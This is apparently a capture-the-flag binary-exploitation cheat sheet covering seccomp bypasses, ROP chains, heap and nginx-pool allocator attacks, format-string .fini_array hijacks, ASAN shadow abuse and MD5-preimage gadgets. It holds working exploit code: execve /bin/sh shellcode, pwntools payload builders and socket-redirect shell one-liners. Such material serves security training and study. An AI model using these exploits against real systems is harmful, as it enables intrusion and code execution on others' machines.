# CTF Pwn - Advanced Techniques

## Seccomp Advanced Techniques

### openat2 Bypass (New Age Pattern)

`openat2` (syscall 437, Linux 5.6+) frequently missed in seccomp filters blocking `open`/`openat`:
```python
# struct open_how { u64 flags; u64 mode; u64 resolve; }  = 24 bytes
# openat2(AT_FDCWD, filename, &open_how, sizeof(open_how))
```

### Conditional Buffer Address Restrictions

Seccomp `SCMP_CMP_LE`/`SCMP_CMP_GE` on buffer addresses:
- `read()` KILL if buf <= code_region + X → read to high addresses
- `write()` KILL if buf >= code_region + Y → write from low addresses

**Bypass:** Read into allowed region, `rep movsb` copy to write-allowed region:
```nasm
lea rsi, [r14 + 0xc01]   ; buf > code_region+0xc00 (passes read check)
xor rax, rax              ; __NR_read
syscall
mov r13, rax
lea rsi, [r14 + 0xc01]   ; src (high)
lea rdi, [r14 + 0x200]   ; dst (low, < code_region+0x400)
mov rcx, r13
rep movsb
mov rdi, 1
lea rsi, [r14 + 0x200]   ; buf < code_region+0x400 (passes write check)
mov rdx, r13
mov rax, 1                ; __NR_write
syscall
```

### Shellcode Construction Without Relocations (pwntools)

pwntools `asm()` fails with forward label references. Fix with manual jmp/call:

```python
body = asm('''
    pop rbx              /* rbx = address after call instruction */
    mov r14, rbx
    and r14, -4096       /* page-align for code_region base */
    mov rsi, rbx         /* filename pointer */
    /* ... rest of shellcode ... */
fail:
    mov rdi, 1
    mov rax, 60
    syscall
''')
call_offset = -(len(body) + 5)
call_instr = b'\xe8' + p32(call_offset & 0xffffffff)
jmp_instr = b'\xeb' + bytes([len(body)]) if len(body) < 128 else b'\xe9' + p32(len(body))
shellcode = jmp_instr + body + call_instr + b"filename.txt\x00"
# call pushes filename address onto stack, pop rbx retrieves it
```

### Seccomp Analysis from Disassembly

```
seccomp_rule_add(ctx, action, syscall_nr, arg_count, ...)
```

`scmp_arg_cmp` struct: `arg` (+0x00, uint), `op` (+0x04, int), `datum_a` (+0x08, u64), `datum_b` (+0x10, u64)

SCMP_CMP operators: `NE=1, LT=2, LE=3, EQ=4, GE=5, GT=6, MASKED_EQ=7`

Default action `0x7fff0000` = `SCMP_ACT_ALLOW`

---

## rdx Control in ROP Chains

After calling libc functions (especially `puts`), `rdx` is often clobbered to a small value (e.g., 1). This breaks subsequent `read(fd, buf, rdx)` calls in ROP chains.

**Solutions:**
1. **pop rdx gadget from libc** — `pop rdx; ret` is rare; look for `pop rdx; pop rbx; ret` (common at ~0x904a9 in glibc 2.35)
2. **Re-enter binary's read setup** — Jump to code that sets `rdx` before `read`:
   ```python
   # vuln's read setup: lea rax,[rbp-0x40]; mov edx,0x100; mov rsi,rax; mov edi,0; call read
   # Set rbp first so rbp-0x40 points to target buffer:
   POP_RBP_RET = 0x40113d
   VULN_READ_SETUP = 0x4011ea  # lea rax, [rbp-0x40]

   payload += p64(POP_RBP_RET)
   payload += p64(TARGET_ADDR + 0x40)  # rbp-0x40 = TARGET_ADDR
   payload += p64(VULN_READ_SETUP)     # read(0, TARGET_ADDR, 0x100)
   # WARNING: After read, code continues to printf + leave;ret
   # leave sets rsp=rbp, so you get a stack pivot to rbp!
   ```
3. **Stack pivot via leave;ret** — When re-entering vuln's read code, the `leave;ret` after read pivots the stack to `rbp`. Write your next ROP chain at `rbp+8` in the data you send via read.

---

## Heap Exploitation

- tcache poisoning (glibc 2.26+)
- fastbin dup / double free
- House of Force (old glibc)
- Unsorted bin attack
- Check glibc version: `strings libc.so.6 | grep GLIBC`

**Heap info leaks via uninitialized memory:**
- Error messages outputting user data may include freed chunk metadata
- Freed chunks contain libc pointers (fd/bk in unsorted bin)
- Missing null-termination in sprintf/strcpy leaks adjacent memory
- Trigger error conditions to leak libc/heap base addresses

**Heap feng shui:**
- Arrange heap layout by controlling allocation order/sizes
- Create holes of specific sizes by allocating then freeing
- Place target structures adjacent to overflow source
- Use spray patterns with incremental offsets (e.g., 0x200 steps)

## Custom Allocator Exploitation

Applications may use custom allocators (nginx pools, Apache apr, game engines):

**nginx pool structure:**
- Pools chain allocations with destructor callbacks
- `ngx_destroy_pool()` iterates cleanup handlers
- Overflow to overwrite destructor function pointer + argument
- When pool freed, calls `system(controlled_string)`

**General approach:**
1. Reverse engineer allocator metadata layout
2. Find destructor/callback pointers in structures
3. Overflow to corrupt pointer + first argument
4. Trigger deallocation to call controlled function

```python
# nginx pool exploit pattern
payload = flat({
    0x00: cmd * (0x800 // len(cmd)),      # Command string
    0x800: [libc.sym.system, HEAP + OFF] * 0x80,  # Destructor spray
    0x1010: [0x1020, 0x1011],              # Pool metadata
    0x1010+0x50: [HEAP + OFF + 0x800]      # Cleanup handler ptr
}, length=0x1200)
```

## JIT Compilation Exploits

**Pattern (Santa's Christmas Calculator):** Off-by-one in instruction encoding causes misaligned machine code.

**Exploitation flow:**
1. Find the boundary value that triggers wrong instruction form (e.g., 128 vs 127)
2. Misaligned bytes become executable instructions
3. Control `rax` to survive invalid dereferences (point to writable memory)
4. Embed shellcode as operand bytes of subtraction operations
5. Chain 4-byte shellcode blocks with 2-byte `jmp` instructions between them

**2-byte instruction shellcode tricks:**
- `push rdx; pop rsi` = `mov rsi, rdx` in 2 bytes
- `xor eax, eax` = 2 bytes (set syscall number)
- `not dl` = 2 bytes (adjust pointer)
- Use `sys_read` to stage full shellcode on RWX page, then jump to it

## Esoteric Language GOT Overwrite

**Pattern (Pikalang):** Brainfuck/Pikalang interpreter with unbounded tape allows arbitrary memory access.

**Exploitation:**
1. Tape pointer starts at known buffer address
2. Move pointer backward/forward to reach GOT entry (e.g., `strlen@GOT`)
3. Overwrite GOT entry byte-by-byte with `system()` address
4. Next call to overwritten function triggers `system(controlled_string)`

**Key insight:** Unbounded tape = arbitrary read/write primitive relative to buffer base.

## Heap Overlap via Base Conversion

**Pattern (Santa's Base Converter):** Number stored as string in different bases has different lengths.

**Exploitation:**
1. Store number in base with short representation (e.g., base-36)
2. Convert to base with longer representation (e.g., base-2/binary)
3. Longer string overflows into adjacent heap chunk metadata
4. Corrupted chunk overlaps with target allocation

**Limited charset constraint:** Only digits/letters available (0-9, a-z) limits writable byte values.

## Tree Data Structure Stack Underallocation

**Pattern (Christmas Trees):** Imbalanced binary tree causes stack buffer underallocation.

**Vulnerability:** Stack allocation based on balanced tree assumption (`2^depth` nodes), but actual traversal of imbalanced tree uses more stack than allocated buffer, causing overflow.

**Exploitation:** Craft tree structure that causes traversal to overflow buffer → overwrite return address → ret2win (partial overwrite if PIE).

## DNS Record Buffer Overflow

**Pattern (Do Not Strike The Clouds):** Many AAAA records overflow stack buffer in DNS response parser.

**Exploitation:**
1. Set up DNS server returning excessive AAAA records
2. Target binary queries DNS, copies records into fixed-size stack buffer
3. Many records overflow into return address
4. Overwrite with win function address

## ASAN Shadow Memory Exploitation

**Pattern (Asan-Bazar, Nullcon 2026):** Binary compiled with AddressSanitizer has format string + OOB write vulnerabilities.

**ASAN Shadow Byte Layout:**
| Shadow Value | Meaning |
|-------------|---------|
| `0x00` | Fully accessible (8 bytes) |
| `0x01-0x07` | Partially accessible (1-7 bytes) |
| `0xF1` | Stack left redzone |
| `0xF3` | Stack right redzone |
| `0xF5` | Stack use after return |

**Key Insight:** ASAN may use a "fake stack" (50% chance) — areas past the ASAN frame have shadow `0x00` on the real stack but different on the fake stack. Detect which by leaking the return address offset.

**Exploitation Pattern:**
```python
# 1. Leak PIE base via format string
payload = b'%8$p'  # Code pointer at known offset
pie_base = leaked - known_offset

# 2. Detect real vs fake stack
# Real stack: return address at known offset from format string buffer
# Check if leaked return address matches expected function offset
is_real_stack = (ret_addr - pie_base) == 0xdc052  # known offset

# 3. Calculate OOB write offset
# Format string buffer at stack offset N
# Target (return address) at stack offset M
# Distance in bytes = (M - N) * 8
# Map to ledger system: slot = distance // 16, sub_offset = distance % 16

# 4. Overwrite return address with win() via OOB ledger write
# Retry until real stack is used (~50% success rate per attempt)
```

**Single-Interaction Exploitation:** Combine leak + detect + exploit in one format string interaction. If fake stack detected, disconnect and retry.

## Format String with Encoding Constraints + RWX .fini_array Hijack

**Pattern (Encodinator, Nullcon 2026):** Input is base85-encoded into RWX memory at fixed address, then passed to `printf()`.

**Key insight:** Don't try libc-based exploitation. Instead, exploit the RWX mmap region directly:

1. **RWX region at fixed address** (e.g., `0x40000000`): Write shellcode here
2. **`.fini_array` hijack**: Overwrite `.fini_array[0]` to point to shellcode. When `main()` returns, `__libc_csu_fini` calls `fini_array` entries.
3. **Format string writes**: Use `%hn` to write 2 bytes at a time to `.fini_array`

**Argument numbering with base85:**
Base85 decoding changes payload length. The decoded prefix occupies P bytes on stack, so first appended pointer is at arg `6 + P/8`. Use convergence loop:

```python
arg_base = 20  # Initial guess
for _ in range(20):
    fmt = construct_format_string(writes, arg_base)
    # Pad to base85 group boundary (multiple of 5 encoded = 4 raw)
    while len(fmt) % 10 != 0:
        fmt += b"A"
    prefix = b85_decode(fmt)
    new_arg_base = 6 + (len(prefix) // 8)
    if new_arg_base == arg_base:
        break
    arg_base = new_arg_base
```

**Shellcode (19-byte execve):**
```nasm
push 0x3b          ; syscall number
pop rax
cdq                ; rdx = 0
movabs rbx, 0x68732f2f6e69622f  ; "/bin//sh"
push rdx           ; null terminator
push rbx           ; "/bin//sh"
push rsp
pop rdi            ; rdi = pointer to "/bin//sh"
push rdx
pop rsi            ; rsi = NULL
syscall
```

**Why avoid libc:** Base85 encoding makes precise libc address calculations extremely difficult. The RWX region + .fini_array approach uses only fixed addresses (no ASLR, no PIE concerns for the write target).

## Custom Canary Preservation

**Pattern (Canary In The Bitcoin Mine):** Buffer overflow must preserve known canary value.

**Key technique:** Write the exact canary bytes at the correct offset during overflow:
```python
# Buffer: 64 bytes | Canary: "BIRD" (4 bytes) | Target: 1 byte
payload = b'A' * 64 + b'BIRD' + b'X'  # Preserve canary, set target to non-zero
```

**Identification:** Source code shows struct with buffer + canary + flag bool, `gets()` for input.

---

## Global Buffer Overflow (CSV Injection)

**Pattern (Spreadsheet):** Adjacent global variables exploitable via overflow.

**Exploitation:**
1. Identify global array adjacent to filename pointer in memory
2. Overflow array bounds by injecting extra delimiters (commas in CSV)
3. Overflowed pointer lands on filename variable
4. Change filename to `flag.txt`, then trigger read operation

```python
# Edit last cell with comma-separated overflow
edit_cell("J10", "whatever,flag.txt")
save()   # CSV row now has 11 columns
load()   # Column 11 overwrites savefile pointer with ptr to "flag.txt"
load()   # Now reads flag.txt into spreadsheet
print_spreadsheet()  # Shows flag
```

## MD5 Preimage Gadget Construction

**Pattern (Hashchain, Nullcon 2026):** Server concatenates N MD5 digests and executes them as code. Brute-force preimages with desired byte prefixes.

**Core technique:** Each MD5 digest is 16 bytes. Use `eb 0c` (jmp +12) as first 2 bytes to skip the middle 12 bytes, landing on bytes 14-15 which become a 2-byte instruction:

```c
// Brute-force MD5 preimage with prefix eb0c and desired 2-byte suffix
for (uint64_t ctr = 0; ; ctr++) {
    sprintf(msg + prefix_len, "%016llx", ctr);
    MD5(msg, msg_len, digest);
    if (digest[0] == 0xEB && digest[1] == 0x0C) {
        uint16_t suffix = (digest[14] << 8) | digest[15];
        if (suffix == target_instruction)
            break;  // Found!
    }
}
```

**Building i386 syscall chains from 2-byte gadgets:**
- `31c0` = `xor eax, eax`
- `89e1` = `mov ecx, esp`
- `b220` = `mov dl, 0x20`
- `cd80` = `int 0x80`
- `40` + NOP = `inc eax`

**Hashchain v2 (4-byte prefix):** Store 4-byte MD5 prefixes at chosen offsets. Build `push <addr>; ret` gadget:
- Word 0: `68 <low3bytes>` (push instruction, 4 bytes)
- Word 1: `<high_byte> c3` (remaining byte + ret)

**Brute-force time:** 32-bit prefix match: ~2^32 hashes (~60s on 8 cores). 16-bit: instant.

## .fini_array Hijack

**When to use:** Binary has writable `.fini_array` section and you have an arbitrary write primitive.

**How it works:** When `main()` returns, `__libc_csu_fini` iterates `.fini_array` entries and calls each as a function pointer. Overwrite `.fini_array[0]` with target address (shellcode, win function, etc.).

```python
# Find .fini_array address
fini_array = elf.get_section_by_name('.fini_array').header.sh_addr
# Or: objdump -h binary | grep fini_array

# Overwrite with format string %hn (2-byte writes)
writes = {
    fini_array: target_addr & 0xFFFF,
    fini_array + 2: (target_addr >> 16) & 0xFFFF,
}
```

**Advantages over GOT overwrite:** Works even with Full RELRO (`.fini_array` is in a different section). Especially useful when combined with RWX regions for shellcode.

## Shell Tricks

**File descriptor redirection (no reverse shell needed):**
```bash
# Redirect stdin/stdout to client socket (fd 3 common for network)
exec <&3; sh >&3 2>&3

# Or as single command string
exec<&3;sh>&3
```
- Network servers often have client connection on fd 3
- Avoids firewall issues with outbound connections
- Works when you have command exec but limited chars

**Find correct fd:**
```bash
ls -la /proc/self/fd           # List open file descriptors
```

**Short shellcode alternatives:**
- `sh<&3 >&3` - minimal shell redirect
- Use `$0` instead of `sh` in some shells
